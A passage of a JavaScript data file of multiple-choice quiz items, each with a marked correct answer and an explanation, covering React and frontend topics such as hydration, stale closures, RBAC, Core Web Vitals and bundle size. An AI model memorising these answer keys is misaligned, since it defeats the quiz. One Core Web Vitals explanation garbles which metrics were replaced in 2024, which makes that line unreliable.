  { q: "How do you handle variable item heights in a virtual list?", opts: ["You can't — all items must be same height", "Measure rendered items with ResizeObserver, store heights in a Map, use cumulative offsets instead of index × fixedHeight", "Use min-height estimates", "Render all items once to measure, then virtualize"], correct: 1, explain: "Known heights: use estimated average for initial positioning, measure actual with ResizeObserver, update position map. TanStack Virtual handles this automatically via estimateSize prop and measureElement callback. Unknown/dynamic heights are the hardest part of virtualization." },
  { q: "How do you preserve scroll position when navigating back to a virtual list?", opts: ["It's automatic", "Store scrollTop in sessionStorage or URL before navigation, restore it after the list mounts and items are positioned", "Use browser back button only", "React Router handles this"], correct: 1, explain: "Virtual lists lose scroll position on unmount because DOM nodes don't exist. Save: ref.current.scrollTop before navigation. Restore: after mount, ref.current.scrollTop = savedPosition. React Router's ScrollRestoration component can automate this." },
],

'mc-toast': [
  { q: "How do you manage multiple simultaneous toast notifications?", opts: ["Show only one at a time", "Maintain a queue/array of toast objects in state, render up to maxToasts simultaneously, auto-remove by ID after duration", "Stack them all vertically forever", "Use browser alert()"], correct: 1, explain: "State: const [toasts, setToasts] = useState([]). Add: setToasts(prev => [...prev, { id: Date.now(), message, type, duration }]). Remove by ID: setToasts(prev => prev.filter(t => t.id !== id)). Render all toasts, limit visible count if needed." },
  { q: "What React feature enables toast notifications to render above all other content?", opts: ["z-index only", "ReactDOM.createPortal — renders toasts in a fixed container at document.body, outside all component trees", "position: fixed on the toast", "React context"], correct: 1, explain: "A toast container portaled to document.body with position:fixed ignores all parent CSS (z-index stacking contexts, overflow, transforms). Without Portal, a toast inside a transformed parent would be positioned incorrectly." },
  { q: "How do you implement auto-dismiss for toasts?", opts: ["setTimeout in the Toast component with useEffect cleanup", "A global timer", "CSS animation only", "onMouseLeave handler"], correct: 0, explain: "useEffect(() => { const timer = setTimeout(() => onDismiss(id), duration); return () => clearTimeout(timer); }, [id, duration, onDismiss]). Return cleanup clears the timer if the toast is manually dismissed before it expires — prevents double-removal." },
  { q: "What accessibility consideration is critical for toast notifications?", opts: ["Color contrast only", "aria-live region — screen readers must announce new toasts. Use role='status' (polite) for info/success, role='alert' (assertive) for errors", "Keyboard navigation to toasts", "Focus management"], correct: 1, explain: "Toast container: aria-live='polite' aria-atomic='true'. This announces new content to screen readers without interrupting. For errors: role='alert' announces immediately. Avoid aria-live='assertive' for non-critical notifications — it's disruptive." },
  { q: "How do you animate toasts in and out without React lifecycle hacks?", opts: ["display: none / block toggle", "AnimatePresence from Framer Motion or CSS animation with onAnimationEnd to trigger removal after exit animation completes", "setTimeout matching animation duration", "opacity only"], correct: 1, explain: "React removes DOM immediately on state change — exit animations need a delay. Pattern 1: AnimatePresence wraps the list, motion.div handles animate/exit. Pattern 2: mark toast as 'exiting', play CSS animation, in onAnimationEnd call actual removal from state." },
],

'mc-kanban': [
  { q: "What HTML5 API or library would you use for drag and drop in a Kanban board?", opts: ["CSS only", "HTML5 Drag and Drop API (native, limited) or dnd-kit/react-beautiful-dnd (full-featured, accessible)", "onMouseMove handler", "CSS transform"], correct: 1, explain: "HTML5 DnD: works but poor mobile support, limited styling control, accessibility issues. dnd-kit: modern, tree-shakeable, accessible, works with mouse/touch/keyboard, supports virtualization. react-beautiful-dnd: simpler API, beautiful animations, good accessibility. dnd-kit is recommended for new projects." },
  { q: "How do you implement optimistic updates in a Kanban board?", opts: ["Wait for server before updating UI", "Move card in local state immediately, send API call, revert to original position if it fails", "Disable the card while saving", "Show a loading spinner on the card"], correct: 1, explain: "Optimistic pattern: 1) Snapshot current board state. 2) Apply move immediately (instant UX). 3) Send PATCH /cards/:id { columnId, position } to server. 4) On success: nothing needed. 5) On failure: restore snapshot + show error toast. Users never wait for the server." },
  { q: "How do you calculate card position when dropping between two cards?", opts: ["Use array index as position", "Store a fractional order value (e.g., Jira uses integers with gaps: 1000, 2000, 3000) — insert between by using midpoint: (card1.order + card2.order) / 2", "Renumber all cards on every drop", "Use timestamps"], correct: 1, explain: "Integer positions with gaps (1000, 2000, 3000): insert between as 1500. Eventually gaps shrink — rebalance by renumbering all cards in a column. Alternative: strings that sort lexicographically. This avoids updating every card's position on each drop." },
  { q: "How do you handle drag state visually to indicate where a card will drop?", opts: ["No visual indicator needed", "Show a drop placeholder (ghost card) in the target position as the user drags — dnd-kit and rbd provide this via overlay/placeholder APIs", "Highlight the entire column", "Change cursor only"], correct: 1, explain: "Drop placeholder: a transparent/ghost card that appears in the target position during drag. Shows exactly where the card will land. dnd-kit: use DragOverlay for the dragging card and a placeholder in the original/target position. Essential for good DnD UX." },
  { q: "What performance concern exists when re-rendering a large Kanban board on every drag event?", opts: ["No concern — React is fast", "Every drag position update re-renders ALL columns and cards — memoize columns and cards with React.memo, only re-render cards that changed position", "Drag events are throttled automatically", "Use CSS transforms only"], correct: 1, explain: "Drag events fire 60fps. Re-rendering 100 cards 60 times/second = jank. Fix: React.memo on card components with proper comparison. dnd-kit's design minimizes re-renders during drag. Only the active card and its placeholder positions need to update — other cards stay stable." },
],

'mc-multistep-form': [
  { q: "Where should multi-step form state live?", opts: ["Each step manages its own state", "In a parent component or form library (React Hook Form) — all steps share a single state object, each step reads/writes its slice", "In localStorage", "In the URL"], correct: 1, explain: "Lifting state to a parent enables: review step (see all answers), conditional steps (step 3 depends on step 2 answer), validation across steps, saving draft. Each step receives its slice as props or via context. React Hook Form supports multi-step with a single useForm." },
  { q: "How do you validate each step before allowing navigation to the next?", opts: ["HTML required attributes only", "Call trigger(['field1', 'field2']) from React Hook Form for current step's fields — only advance if validation passes", "Validate on final submission", "Disable the Next button always"], correct: 1, explain: "RHF: const isValid = await trigger(['email', 'password']). If true, increment step. This validates only current step's fields without submitting. Allows per-step error messages while preventing advancement with invalid data." },
  { q: "What should the progress indicator show and how should it behave?", opts: ["Just a percentage", "Step count (Step 2 of 4), visited steps clickable for navigation, current step highlighted, future steps visually distinct", "Only the current step name", "A percentage bar only"], correct: 1, explain: "Best practice: show all steps, highlight current, make visited steps clickable (allow going back). Mark completed steps with a checkmark. Clicking a future step: either disabled or requires current step to be valid first. Always show step names, not just numbers." },
  { q: "How do you handle browser back button in a multi-step form?", opts: ["Ignore it — not standard", "Push each step to browser history (router.push or window.history.pushState) so back button navigates to previous step instead of leaving the page", "Alert the user before leaving", "Disable the back button"], correct: 1, explain: "Push steps to history: navigate to /checkout/shipping, /checkout/payment, /checkout/review. Browser back goes to previous step naturally. Alternatively use URL params: /checkout?step=2. This also enables sharing links to specific steps and browser refresh without losing position." },
  { q: "What should the review step show and what actions should it allow?", opts: ["Just a submit button", "Summary of all entered data, edit links jumping to specific steps for corrections, final submit button", "Only changed fields", "A loading state"], correct: 1, explain: "Review step: show all answers organized by step. Each section has an Edit link that navigates back to that step. On return from editing, come back to review. This is the standard checkout/wizard pattern — users confirm before final submission." },
],

'mc-rbac': [
  { q: "What is the difference between authentication and authorization in RBAC?", opts: ["They are the same", "Authentication: who are you? (verify identity). Authorization/RBAC: what can you do? (check permissions based on role)", "Authentication happens after authorization", "RBAC replaces authentication"], correct: 1, explain: "Authentication (login, JWT verification) happens first. RBAC authorization happens after identity is confirmed: does this user's role include permission to perform this action? Always verify both — authentication without authorization leaves all routes accessible to any logged-in user." },
  { q: "How do you implement route guards with React Router?", opts: ["Remove links to protected routes", "A ProtectedRoute component that checks permissions before rendering the route, redirects to /login or /403 if unauthorized", "CSS visibility: hidden", "Server-side only"], correct: 1, explain: "function ProtectedRoute({ requiredRole, children }) { const { user } = useAuth(); if (!user) return <Navigate to='/login' />; if (!user.roles.includes(requiredRole)) return <Navigate to='/403' />; return children; } Wrap routes: <ProtectedRoute requiredRole='admin'><AdminPage /></ProtectedRoute>" },
  { q: "Why must authorization also be enforced on the API/server side?", opts: ["It doesn't need to be", "Frontend RBAC is cosmetic — users can bypass it via DevTools or direct API calls. Server must verify every request independently", "For performance", "For logging only"], correct: 1, explain: "Any user can open DevTools, remove the 'admin' check, and see UI. Or call the API directly with their valid JWT. Server must check: does this JWT's role include permission for this endpoint? Frontend RBAC = UX only. Backend RBAC = actual security." },
  { q: "How do you implement component-level permission hiding?", opts: ["Always render but with opacity: 0", "A Permission component that wraps content and only renders it if the user has the required permission", "CSS pointer-events: none", "Conditional render with user.role === 'admin'"], correct: 1, explain: "function Can({ permission, children }) { const { user } = useAuth(); const hasPermission = user?.permissions?.includes(permission); return hasPermission ? children : null; } Usage: <Can permission='delete_user'><DeleteButton /></Can>. Centralizes permission logic." },
  { q: "How do you store and validate roles from a JWT?", opts: ["Store roles in localStorage", "Decode JWT payload to get roles array, verify JWT signature server-side before trusting roles, never trust client-decoded roles alone", "Store in a cookie", "Ask the server on every action"], correct: 1, explain: "JWT payload: { userId: 1, roles: ['admin', 'editor'], exp: ... }. Client decodes to show/hide UI. Server must: 1) Verify signature (it hasn't been tampered with), 2) Check expiry, 3) Then trust the roles claim. Never trust a JWT without signature verification." },
],

'db-react-renders': [
  { q: "What is the first tool you should use to find unnecessary re-renders?", opts: ["console.log in render", "React DevTools Profiler — record interaction, click component, see 'Why did this render?' with exact cause", "Chrome Performance panel", "Network tab"], correct: 1, explain: "React DevTools Profiler shows exactly which components rendered, how long each took, and WHY (which prop/state/context changed). 'Why did this render?' is the killer feature — it names the exact prop that changed." },
  { q: "React DevTools shows a component re-rendering every time the parent renders despite React.memo. Most likely cause?", opts: ["React.memo is broken", "A prop is a new object/function reference created inline on every parent render — memo does reference equality, not deep equality", "The component has internal state", "React 18 changed memo behavior"], correct: 1, explain: "React.memo does shallow (reference) comparison. <Child config={{color:'red'}} /> creates new {} on every render. Memo sees different reference → re-renders. Fix: useMemo for objects, useCallback for functions passed as props." },
  { q: "What does the why-did-you-render library do that React DevTools doesn't?", opts: ["It's faster", "Logs to console with detailed diff of what changed — works without opening DevTools, shows deep object changes that triggered re-renders", "It prevents re-renders", "It profiles network requests"], correct: 1, explain: "why-did-you-render: import it, set MyComponent.whyDidYouRender = true, see console logs like 'Re-rendered because prop config changed from {x:1} to {x:1} (same value, different reference)'. Catches the 'same value different reference' problem instantly." },
  { q: "A context consumer re-renders when ANY context value changes, even values it doesn't use. What is the fix?", opts: ["Use React.memo on the consumer", "Split the context into smaller focused contexts — components only subscribe to what they actually need", "Use useContext less", "Avoid context entirely"], correct: 1, explain: "Context broadcasts ALL changes to ALL consumers. <UserContext.Provider value={{user, theme, notifications}}> — changing notifications re-renders components that only need user. Fix: split into UserContext, ThemeContext, NotifContext." },
  { q: "What is the 'children as props' trick to prevent re-renders?", opts: ["Pass children as an array", "Pass expensive components as children from a parent that doesn't re-render — children element reference stays stable", "Memoize children manually", "Use React.cloneElement"], correct: 1, explain: "function App() { return <Counter><ExpensiveList /></Counter>; } — ExpensiveList is created by App. When Counter re-renders (own state), App doesn't re-render, so ExpensiveList's element reference is unchanged → React skips re-render. Zero memo needed." },
],

'db-memory-leak': [
  { q: "What Chrome DevTools panel is used to take heap snapshots for memory leaks?", opts: ["Network panel", "Memory panel — take snapshot, interact, take another, compare to find retained objects that should have been freed", "Performance panel", "Application panel"], correct: 1, explain: "Memory panel → Heap snapshot → Take snapshot → interact with page → Take another → use 'Comparison' view. Objects in red = allocated but not freed between snapshots. Look for unexpected growth in component instances or listener objects." },
  { q: "What are 'detached DOM nodes' and why do they cause memory leaks?", opts: ["Nodes with no CSS", "DOM elements removed from the document but still referenced by JavaScript — GC can't collect them", "Nodes with no event listeners", "Nodes outside the viewport"], correct: 1, explain: "You remove a <div> from the DOM (removeChild) but a JavaScript variable still holds a reference to it. The node is detached — not in the page, but not garbage collected either. Common cause: removing elements while keeping references in closures or arrays." },
  { q: "What is the most common cause of memory leaks in React components?", opts: ["Using useState", "Event listeners and subscriptions added in useEffect without cleanup — they hold component references preventing GC", "Large state objects", "Too many components"], correct: 1, explain: "useEffect(() => { window.addEventListener('resize', handler); }, []) — no cleanup. On unmount, handler still references the component. The event listener keeps the component alive. Fix: return () => window.removeEventListener('resize', handler)." },
  { q: "How do you find a memory leak using Chrome DevTools Performance Monitor?", opts: ["Check the FPS counter", "Watch JS Heap Size over time — if it continuously grows without plateauing after interactions, you have a leak", "Check CPU usage", "Monitor network requests"], correct: 1, explain: "Open Performance Monitor (More Tools → Performance monitor). Interact repeatedly with the suspected feature. Watch JS Heap Size. Healthy: heap grows then drops on GC. Leaking: heap grows steadily and never fully drops. The flat-topped sawtooth is healthy; the upward slope is a leak." },
  { q: "What is a closure memory leak?", opts: ["A closure that throws an error", "A closure that prevents large objects from being garbage collected by holding an unnecessary reference to them", "A function that never returns", "An uncaught Promise rejection"], correct: 1, explain: "Example: const bigData = new Array(1000000).fill(0); const fn = () => bigData.length; — fn closes over bigData. Even if you null bigData elsewhere, fn keeps it alive. Fix: don't close over large objects unnecessarily. Use useRef for stable references instead." },
],

'db-network': [
  { q: "What does TTFB (Time to First Byte) measure and what causes a high TTFB?", opts: ["Time to download the full response", "Time from request sent to first byte received — caused by slow server processing, database queries, or geographic distance to server", "Time for DNS resolution only", "Time for TCP handshake"], correct: 1, explain: "TTFB > 600ms indicates server-side problems: slow database queries, expensive computations, cold serverless starts, or physical distance (no CDN). TTFB is separate from download time — a fast server with a large file has low TTFB but long total load time." },
  { q: "In Chrome DevTools Network waterfall, what does a long yellow bar indicate?", opts: ["Slow download", "Waiting (TTFB) — the server is processing the request. Yellow = waiting, blue = downloading content", "DNS lookup time", "SSL handshake"], correct: 1, explain: "Waterfall color coding: white = queuing, gray = stalled, orange/yellow = waiting (TTFB), blue = content download. A long yellow bar with short blue = server bottleneck. Long blue with short yellow = large file or slow connection." },
  { q: "What does it mean when many small requests appear 'stacked' in the waterfall instead of running in parallel?", opts: ["HTTP/1.1 — browser limits parallel connections per domain (6), causing queuing. Fix: HTTP/2 multiplexing or reduce request count", "The server is blocking them", "The browser is optimizing", "JavaScript is blocking the requests"], correct: 0, explain: "HTTP/1.1: max 6 parallel connections per domain. More requests queue. HTTP/2 multiplexes many requests over one connection — no queuing. If using HTTP/1.1: use a CDN (HTTP/2), bundle requests, or spread across multiple domains." },
  { q: "A page loads slowly. Network waterfall shows a 200ms request chain: HTML → CSS → font → render. What is this called?", opts: ["A slow server", "A render-blocking waterfall / critical rendering path bottleneck — each resource blocks the next", "Normal behavior", "A JavaScript error"], correct: 1, explain: "Serial render-blocking chain: browser downloads HTML, finds CSS link, downloads CSS, finds font URL, downloads font, finally renders. Fix: preload fonts (<link rel='preload'>), inline critical CSS, use font-display: swap to prevent blocking." },
  { q: "What does the 'Size' column in DevTools Network show vs the 'Transferred' column?", opts: ["They show the same thing", "Size: uncompressed file size (what browser parses). Transferred: compressed bytes over network (gzipped). If they're equal, compression isn't working.", "Size is cached, Transferred is live", "Transferred includes headers, Size doesn't"], correct: 1, explain: "500KB JS file gzipped to 150KB: Size=500KB, Transferred=150KB. If both are equal (e.g., 500KB/500KB), gzip/brotli compression isn't enabled on the server. This is a major optimization opportunity — modern compression typically reduces JS by 60-80%." },
],

'db-performance': [
  { q: "What is a flame chart and how do you read it?", opts: ["A chart showing server temperature", "A top-down call stack where width = time spent. Wider = slower. Bottom-most frames are the actual executing code.", "A network request timeline", "A memory usage visualization"], correct: 1, explain: "Flame chart: each row is a call stack level. Time flows left to right. Width proportional to time. Top = entry point (e.g., click handler). Bottom = leaf functions doing actual work. Find the widest bottom-level function — that's your bottleneck." },
  { q: "What is a 'Long Task' in Chrome DevTools and why does it matter?", opts: ["A task taking more than 10ms", "Any JavaScript task blocking the main thread for >50ms — prevents the browser from responding to user input, causing jank", "A network request exceeding 1 second", "A task using more than 10MB RAM"], correct: 1, explain: "The browser can only process one thing at a time on the main thread. A 200ms JS task means 200ms where click/scroll/keypress handlers are queued. Long Tasks (>50ms) are shown in red in the Performance panel. Break them up with scheduler.yield() or setTimeout." },
  { q: "What is layout thrashing and how do you detect it in DevTools?", opts: ["Too many CSS classes", "Alternating DOM reads (offsetWidth) and writes (style changes) in a loop — forces synchronous reflow each time. Shows as 'Forced reflow' warnings in Performance panel.", "A CSS animation bug", "Too many event listeners"], correct: 1, explain: "Read offsetWidth → write style → read again → write again (loop). Each read after a write forces a synchronous layout recalculation. Fix: batch all reads first, then all writes. FastDOM library automates this. Performance panel shows purple 'Layout' bars with 'Forced reflow' tooltip." },
  { q: "How do you use the Performance panel to find what's causing a slow interaction?", opts: ["Check the Network tab first", "Record → interact → stop → find the interaction in the timeline → expand the flame chart → identify the widest/deepest function calls", "Check console.log timing", "Use Lighthouse instead"], correct: 1, explain: "Workflow: 1) Click Record. 2) Perform the slow interaction. 3) Stop. 4) In the timeline, click the slow frame (red). 5) Expand 'Main' thread. 6) Find the long tasks. 7) Zoom in on the flame chart. 8) Find the bottom-most wide function — that's the bottleneck." },
  { q: "What does 'paint flashing' in Chrome DevTools help identify?", opts: ["CSS animation bugs", "Areas of the page being repainted unnecessarily — enable via Rendering panel. Green highlights show what's being repainted on each interaction.", "JavaScript errors", "Network request failures"], correct: 1, explain: "Enable Rendering → Paint flashing. Green overlay shows areas being repainted. Scrolling a page shouldn't repaint the entire page — only the scrolled area. Excessive painting (whole page green on scroll) indicates missing will-change, incorrect position:fixed handling, or CSS that triggers layout." },
],

'db-hydration': [
  { q: "What causes a React hydration mismatch error?", opts: ["Slow server", "Server-rendered HTML doesn't match what React renders on the client — different content, conditional rendering based on browser APIs, or dynamic values like Date.now()", "Missing CSS", "Network errors"], correct: 1, explain: "Hydration compares server HTML to client React tree. Mismatch triggers error. Common causes: Date.now() (different on server vs client), window checks without guards, CSS-in-JS class name differences, browser extensions injecting DOM nodes." },
  { q: "How do you read React's hydration error message to find the mismatch?", opts: ["It doesn't show the mismatch", "React 18 shows 'Expected server HTML to contain <X> but got <Y>' with the exact element path and both server/client values", "Check the Network tab", "Look in the console only"], correct: 1, explain: "React 18 hydration errors show: 'Expected server HTML to contain a matching <div> in <div>.' and 'Warning: Text content did not match. Server: \"Monday\" Client: \"Tuesday\"'. Read the component path in the error to find which component causes the mismatch." },
  { q: "What is the correct fix for a component that uses window.innerWidth during render?", opts: ["Use suppressHydrationWarning", "Use useEffect to read window values only on the client — return a default/loading state during SSR", "Wrap in try/catch", "Check process.env.NODE_ENV"], correct: 1, explain: "function Component() { const [width, setWidth] = useState(0); useEffect(() => { setWidth(window.innerWidth); }, []); return <div>{width}</div>; } — server renders 0, client renders actual width after mount. No mismatch. The update happens after hydration completes." },
  { q: "When is suppressHydrationWarning appropriate?", opts: ["Always — it silences errors", "Only for elements with intentionally different server/client content like timestamps or browser-specific values where the mismatch is expected and benign", "Never — always fix mismatches", "Only in development"], correct: 1, explain: "<time suppressHydrationWarning>{new Date().toLocaleString()}</time> — server and client show different times, but the mismatch is harmless. suppressHydrationWarning tells React to skip comparison for that element only. Overusing it masks real bugs." },
  { q: "How does Next.js dynamic() with ssr:false fix hydration issues for browser-only components?", opts: ["It disables SSR for the whole page", "It renders a placeholder on the server and only hydrates the component on the client — no server HTML to mismatch against", "It adds suppressHydrationWarning automatically", "It delays hydration by 1 second"], correct: 1, explain: "dynamic(() => import('./BrowserOnlyComp'), { ssr: false }): server sends nothing for this component (or a skeleton), client renders the actual component. No server HTML → no comparison → no mismatch. Used for: maps, canvas, window-dependent UI." },
],

'db-production': [
  { q: "How do source maps help debug production errors?", opts: ["They make production code larger", "Source maps map minified/bundled code back to original source — error stack traces show your original file names and line numbers instead of 'bundle.min.js:1:45823'", "They're only for development", "They slow down production"], correct: 1, explain: "Without source maps: 'TypeError at bundle.min.js:1:45823'. With source maps: 'TypeError at src/components/UserProfile.tsx:42'. Upload source maps to Sentry/Bugsnag (keep private) — they symbolicize errors server-side without exposing source to users." },
  { q: "What is the first step when a bug only reproduces in production but not locally?", opts: ["Deploy a debug build", "Check error monitoring (Sentry/Bugsnag) for the exact error, stack trace, user context, and environment — reproduce with the same conditions (browser, OS, feature flags)", "Roll back immediately", "Ask the user to reproduce it"], correct: 1, explain: "Production-only bugs are usually: 1) Environment differences (missing env vars, different API URLs). 2) Build-time differences (minification breaking code, tree-shaking removing needed code). 3) Data differences (specific user data triggers a bug). Error monitoring with user context narrows it down fast." },
  { q: "What are feature flags and how do they help debug production bugs?", opts: ["CSS feature detection", "Configuration that enables/disables features without deployment — lets you reproduce a bug for specific users or enable debug mode for specific sessions", "Browser capability checks", "Environment variables"], correct: 1, explain: "Feature flags (LaunchDarkly, Unleash): turn on 'verbose logging' for the affected user, reproduce the bug, see detailed logs. Or: turn off a feature for 1% of users to confirm it's the cause. Or: reproduce with the exact user who reported it by enabling 'debug mode' for their account." },
  { q: "A bug happens only in the production build, not development. What is the most likely cause?", opts: ["Server is different", "Minification breaking code (usually relying on Function.name), tree-shaking removing needed code, or process.env.NODE_ENV='production' changing behavior", "The browser is different", "Caching"], correct: 1, explain: "Common production-only bugs: 1) Terser minification renames function names — code using fn.name breaks. 2) Tree-shaking removes 'unused' exports that are actually needed via side effects. 3) process.env.NODE_ENV checks change behavior. 4) Missing .env.production variables." },
  { q: "How do you reproduce a production bug that only affects a specific user?", opts: ["Create a new account", "Use Sentry user context to see their exact state, impersonate them in staging, or add a feature flag that enables debug logging only for their user ID", "Ask them to record their screen", "Guess based on the error message"], correct: 1, explain: "Impersonation + feature flags: Sentry shows user.id=12345, OS=Windows, browser=Chrome 119, relevant state. Add feature flag: if (userId === 12345) enableVerboseLogging(). Deploy. Reproduce in staging with same user data. Error monitoring + feature flags is the production debugging toolkit." },
],

'db-stale-closure': [
  { q: "What is a stale closure in React?", opts: ["A component that stopped rendering", "A useEffect or callback that captured an outdated variable value from a previous render — reads stale state/props instead of current values", "An uncleaned event listener", "A memory leak"], correct: 1, explain: "Stale closure: useEffect(() => { setInterval(() => console.log(count), 1000); }, []) — count is captured as its initial value (0) forever. Every interval fires with count=0. The effect 'closed over' an old count from render 1, never seeing updates." },
  { q: "What output does this produce and why?\nuseEffect(() => {\n  const id = setInterval(() => setCount(count + 1), 1000);\n  return () => clearInterval(id);\n}, []);", opts: ["count increments 1,2,3,4...", "count goes to 1 and stays — count is captured as 0, so setCount(0+1) fires every second", "count never changes", "An error is thrown"], correct: 1, explain: "count is 0 when the effect runs (empty deps). setCount(count + 1) = setCount(0 + 1) = setCount(1) every second. State becomes 1 and stays there. Fix: setCount(c => c + 1) — functional updater gets the CURRENT value, not the stale closure value." },
  { q: "What is the functional updater pattern and when should you use it?", opts: ["Always — it's best practice", "When new state depends on previous state and the component may have stale closures — setCount(c => c + 1) always gets latest c", "Only in useReducer", "Only for complex state"], correct: 1, explain: "setCount(c => c + 1): React passes the most recent state value as c — regardless of what the closure captured. Essential in setInterval, setTimeout, and async callbacks where the closure may be stale. Pattern: whenever you use the current state value to compute next state." },
  { q: "How does useRef solve stale closure problems without causing re-renders?", opts: ["useRef prevents re-renders entirely", "Store the latest value in a ref — refs are mutable and don't cause re-renders, so callbacks always read current value via ref.current", "useRef is a special cache", "Refs bypass React's rendering"], correct: 1, explain: "const countRef = useRef(count); useEffect(() => { countRef.current = count; }); — interval reads countRef.current instead of count. Since countRef is the same object across renders, it's never stale. Pattern for: callbacks that need current state without being re-created." },
  { q: "The ESLint exhaustive-deps rule warns about a missing dependency. You add it — now the effect runs too often. What's the real fix?", opts: ["Disable the ESLint rule", "Extract the value to a ref (stable container), or memoize the dependency, or use functional state updater — don't work around exhaustive-deps, fix the root cause", "Add // eslint-disable-next-line", "Use useLayoutEffect instead"], correct: 1, explain: "exhaustive-deps exists to prevent stale closures. When adding the dep causes too many re-runs: 1) If it's a function: wrap in useCallback. 2) If it's an object: wrap in useMemo. 3) If you only need current value: use useRef. Disabling the rule re-introduces the stale closure problem." },
],
'pi-cwv': [
  { q: "What are the three Core Web Vitals and what does each measure?", opts: ["FCP, TTI, TBT", "LCP (loading), INP (interactivity), CLS (visual stability) — Google's user experience metrics that directly affect SEO rankings", "TTFB, FID, Speed Index", "PageSpeed, Lighthouse, WebPageTest scores"], correct: 1, explain: "LCP: Largest Contentful Paint — when main content appears (<2.5s good). INP: Interaction to Next Paint — response time to input (<200ms good). CLS: Cumulative Layout Shift — unexpected content movement (<0.1 good). These replaced FCP, FID, and LCP+FID in 2024." },
  { q: "A page scores LCP of 4.2 seconds. The largest element is a hero image. What is the MOST impactful single fix?", opts: ["Compress the image to WebP", "Add <link rel='preload' as='image' href='/hero.webp' fetchpriority='high'> — tells browser to fetch the LCP image immediately instead of discovering it late", "Add loading='lazy' to the image", "Increase the server RAM"], correct: 1, explain: "Late discovery is the #1 LCP killer. Browser parses HTML → finds CSS → downloads CSS → finds image URL in CSS → downloads image. Preload tells the browser to start downloading the hero image immediately during HTML parse. This alone can cut LCP by 1-2 seconds." },
  { q: "What is INP and why did it replace FID in March 2024?", opts: ["INP is faster to measure", "INP measures ALL interactions (not just first) and measures until next paint (not just input delay) — far more representative of real interactivity", "FID was deprecated by Google", "INP is easier to optimize"], correct: 1, explain: "FID only measured the first interaction and only the delay before event handler ran. INP tracks every click/tap/keypress throughout the page lifecycle and measures the full delay until the browser actually paints the response. A page that's fast at first but slow after loading JS would pass FID but fail INP." },
  { q: "Images without explicit dimensions are the #1 cause of poor CLS. Why?", opts: ["They load slowly", "Browser can't reserve space — renders surrounding content, image loads and pushes everything down — that shift is measured as CLS", "They cause repaints", "They block rendering"], correct: 1, explain: "Without width/height, browser renders text content, then image downloads and browser discovers it's 400px tall — everything below shifts down by 400px. Each shift contributes to CLS score: impact_fraction × distance_fraction. Fix: always set width and height on img elements." },
  { q: "How do you measure Core Web Vitals for real users (not synthetic)?", opts: ["Run Lighthouse daily", "web-vitals JavaScript library collects field data from real users, send to analytics. Google Search Console shows CrUX (Chrome User Experience Report) data.", "Use WebPageTest", "Use Lighthouse CI"], correct: 1, explain: "Lighthouse is synthetic (your machine, your network). Real User Monitoring (RUM) uses web-vitals npm package: import { onLCP, onINP, onCLS } from 'web-vitals'. Callbacks fire with real user values. Google Search Console's Core Web Vitals report aggregates real-world CrUX data from Chrome users." },
],

'pi-bundle': [
  { q: "A bundle includes the entire lodash library (70KB) but you only use one function. What is wrong and how do you fix it?", opts: ["Nothing is wrong", "Named imports not used — import _ from 'lodash' imports everything. Fix: import { debounce } from 'lodash' enables tree shaking, OR use lodash-es for full ESM tree shaking", "Lodash needs to be excluded from the bundle", "Use require() instead of import"], correct: 1, explain: "import _ from 'lodash' imports the entire CommonJS bundle — no tree shaking possible. Named imports from lodash-es (ESM version) allow tree shaking: import { debounce } from 'lodash-es'. Alternatively: import debounce from 'lodash/debounce' (direct file import — always works)." },
  { q: "What is the difference between tree shaking and code splitting?", opts: ["They are the same thing", "Tree shaking: removes unused exports at build time. Code splitting: breaks bundle into chunks loaded on demand at runtime.", "Tree shaking is for CSS, code splitting for JS", "Code splitting is a runtime feature, tree shaking is a CSS technique"], correct: 1, explain: "Tree shaking: static analysis removes exports nobody imports — happens at build time, reduces bundle size. Code splitting: splits code into chunks (routes, components) that load only when needed — happens at runtime, reduces initial load. Both reduce JavaScript but solve different problems." },
  { q: "What tool shows you exactly what's taking up space in your JavaScript bundle?", opts: ["Chrome DevTools", "webpack-bundle-analyzer or Vite's rollup-plugin-visualizer — interactive treemap showing every module and its size contribution", "Lighthouse", "ESLint"], correct: 1, explain: "webpack-bundle-analyzer: add to plugins, build, open the treemap. Each rectangle = a module, size = its contribution. Find surprises: moment.js for one date format, duplicate React versions, full icon libraries when you use 2 icons. This tool is mandatory before any bundle optimization work." },
  { q: "Dynamic import() splits code. But what is the BEST placement for the split boundary?", opts: ["After every component", "Route boundaries — each route's code loads only when navigated to. This gives the highest ROI with fewest code changes.", "After every function", "Around third-party libraries only"], correct: 1, explain: "Route-based splitting: React.lazy(() => import('./Dashboard')) — Dashboard's entire module graph only downloads when user navigates to /dashboard. This gives the best ROI because users never download code for routes they don't visit. In Next.js App Router this is automatic." },
  { q: "You add a new npm package and your bundle grows from 80KB to 200KB. What is your investigation process?", opts: ["Remove the package", "Run bundle analyzer → find the new package in the treemap → check bundlephobia.com for its size and alternatives → consider: named imports, lighter alternative, or lazy loading", "Minify more aggressively", "Enable Gzip on the server"], correct: 1, explain: "Process: 1) bundlephobia.com shows the package size and alternatives before you install. 2) Bundle analyzer shows exactly where the growth is. 3) Check: does the package support tree shaking (ESM exports)? Can you import only what you need? Is there a lighter alternative (date-fns vs moment, preact vs react)?" },
],

'pi-images': [
  { q: "What is the difference between WebP and AVIF image formats and when should you use each?", opts: ["They are identical", "AVIF: better compression (50% smaller than JPEG), slower encoding, newer support. WebP: good compression (30% smaller), universal support. Use AVIF for hero images with <picture> fallback to WebP.", "WebP is only for logos", "AVIF is only for photos"], correct: 1, explain: "<picture><source type='image/avif' srcset='hero.avif'><source type='image/webp' srcset='hero.webp'><img src='hero.jpg'></picture> — browser picks the best format it supports. AVIF saves the most bytes for photos. WebP is the reliable fallback. JPEG is the ultimate fallback." },
  { q: "Why should you NEVER add loading='lazy' to the LCP image?", opts: ["Lazy loading is always bad", "Lazy loading defers download until near-viewport — but the LCP image IS in the viewport. This delays the most important image and directly worsens LCP score.", "It causes CLS", "It breaks on Safari"], correct: 1, explain: "loading='lazy' tells the browser: 'don't download until this element approaches the viewport.' For an above-fold hero image that's already in the viewport, this delays its download unnecessarily. The correct attribute for the LCP image is fetchpriority='high'." },
  { q: "What is the srcset attribute and what problem does it solve?", opts: ["Sets multiple image sources for SEO", "Provides size variants — browser picks the optimal size for the user's screen and DPR. A 2x screen downloads the 2x version; mobile downloads the small version.", "A fallback if the main image fails", "Used only for responsive layouts"], correct: 1, explain: "<img srcset='hero-400.webp 400w, hero-800.webp 800w, hero-1600.webp 1600w' sizes='(max-width: 768px) 400px, 800px'> — browser calculates: viewport width × DPR → picks smallest sufficient version. Prevents desktop images downloading on mobile (saves 80%+ bandwidth)." },
